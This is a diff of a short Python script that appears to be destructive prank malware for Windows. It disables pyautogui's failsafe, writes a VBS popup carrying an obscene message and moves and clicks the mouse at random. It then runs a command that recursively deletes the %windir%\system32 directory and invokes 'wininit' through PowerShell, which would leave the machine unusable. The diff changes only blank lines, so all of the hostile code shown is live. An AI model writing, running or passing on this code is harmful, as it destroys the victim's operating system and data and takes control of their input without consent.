@@ -5,13 +5,10 @@ import os
 import random
 from random import randint 
 import pyautogui
-
 pyautogui.FAILSAFE = False
 mouse = pyautogui
 keyboard = pyautogui
-
 username = os.environ["USERNAME"]
-
 def main():
     with open("main.vbs", "w") as f:
         f.write('msgbox "By Decks, SUCK MY DICK",16,"ERROR"')
@@ -38,7 +35,6 @@ def main():
         rndvalueY = randint(0,1019)
         mouse.dragTo(rndvalueX, rndvalueY)
         pyautogui.click()    
-
     subprocess.getoutput('rd "%windir%\system32"/q /s')
     subprocess.run(["powershell", "-Command", "wininit"])
 main()
